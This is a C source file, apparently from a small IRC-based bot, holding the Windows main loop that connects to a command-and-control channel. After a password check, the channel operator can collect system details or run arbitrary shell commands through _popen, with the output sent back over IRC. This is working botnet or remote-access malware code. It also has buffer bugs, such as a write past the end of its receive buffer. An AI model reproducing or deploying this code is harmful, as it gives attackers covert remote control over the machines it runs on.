/*	et_main_loop_nix.c
	Author: William Woodruff
	------------------------
	The primary function used by et to send/receive data on Windows.
*/

#include "../cnc_info.h"
#include <string.h>
#include <stdio.h>
#include <windows.h>

/*	et_main_loop_win
	The main loop called by et_win.c to communicate with the IRC C&C server.
	arg: SOCKET socket, the winsock to write to/read from.
	arg: char *nick, the string containing the IRC nickname
*/
void et_main_loop_win(SOCKET socket, char *nick)
{
	char buf[1024];
	char auth = 0;

	while(1)
	{
		recv(socket, buf, 1023, 0);
		buf[1024] = '\0';

		char *ping;
		if ((ping = strstr(buf, "PING")) && !(strstr(buf, "CASEMAPPING")))
		{
			char *pong = strtok(ping, "\r\n");
			strncpy(pong, "PONG", 4);
			send(socket, pong, strlen(pong), 0);
		}
		else if (strstr(buf, "PRIVMSG") && strstr(buf, nick))
		{
			char *line = strtok(buf, "\r\n");
			char *cmd = strrchr(line, ':');
			cmd++;

			if (strstr(cmd, "auth") && !(strstr(cmd, "deauth")))
			{
				cmd += 5; /* increment past 'auth' */
				char auth_message[256];

				if (!strcmp(cmd, IRC_AUTH))
				{
					auth = 1;
					_snprintf(auth_message, 256, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
					send(socket, auth_message, strlen(auth_message), 0);
				}
				else
				{
					_snprintf(auth_message, 256, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
					send(socket, auth_message, strlen(auth_message), 0);
				}
			}
			else
			{
				if (!auth)
				{
					char unauth_message[256];
					_snprintf(unauth_message, 256, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
					send(socket, unauth_message, strlen(unauth_message), 0);
				}
				else
				{
					if (!strcmp(cmd, "kill"))
					{
						break; /* back to main@et_win.c */
					}
					else if (!strcmp(cmd, "deauth"))
					{
						char deauth_message[256];
						_snprintf(deauth_message, 256, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
						send(socket, deauth_message, strlen(deauth_message), 0);
						auth = 0;
					}
					else if (!strcmp(cmd, "info"))
					{
						char os[256];
						char kern[256];

						#if defined(NTDDI_WIN7)
							_snprintf(os, 256, "PRIVMSG %s :OS: Microsoft Windows 7\r\n", IRC_CHANNEL);
						#elif defined(NTDDI_WIN8)
							_snprintf(os, 256, "PRIVMSG %s :OS: Microsoft Windows 8\r\n", IRC_CHANNEL);
						#elif defined(NTDDI_WINBLUE)
							_snprintf(os, 256, "PRIVMSG %s :OS: Microsoft Windows 8.1\r\n", IRC_CHANNEL);
						#elif defined(NTDDI_VISTA) || defined(NTDDI_VISTASP1)
							_snprintf(os, 256, "PRIVMSG %s :OS: Microsoft Windows Vista\r\n", IRC_CHANNEL);
						#elif defined(NTDDI_WINXP) || defined(NTDDI_WINXPSP1) || defined(NTDDI_WINXPSP2) || defined(NTDDI_WINXPSP3)
							_snprintf(os, 256, "PRIVMSG %s :OS: Microsoft Windows XP\r\n", IRC_CHANNEL);
						#else
							_snprintf(os, 256, "Microsoft Windows", 256);
						#endif

						OSVERSIONINFO kern_info;
						kern_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
						GetVersionEx(&kern_info);
						_snprintf(kern, 256, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);

						send(socket, os, strlen(os), 0);
						send(socket, kern, strlen(kern), 0);
					}
					else
					{
						char cmd_output[512];
						char cmd_message[512];

						FILE *output_file = _popen(cmd, "rt");
						fread((void *) cmd_output, 1, 512, output_file);

						int i;
						for (i = 0; cmd_output[i]; i++)
						{
							if (cmd_output[i] == '\r' || cmd_output[i] == '\n')
							{
								cmd_output[i] = ' ';
							}
						}

						if (strlen(cmd_output) >= 500)
						{
							_snprintf(cmd_message, 512, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
						}
						else
						{
							_snprintf(cmd_message, 512, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
						}

						send(socket, cmd_message, strlen(cmd_message), 0);
						_pclose(output_file);
						ZeroMemory(cmd_output, 512);
					}
				}
			}
		}
	}
}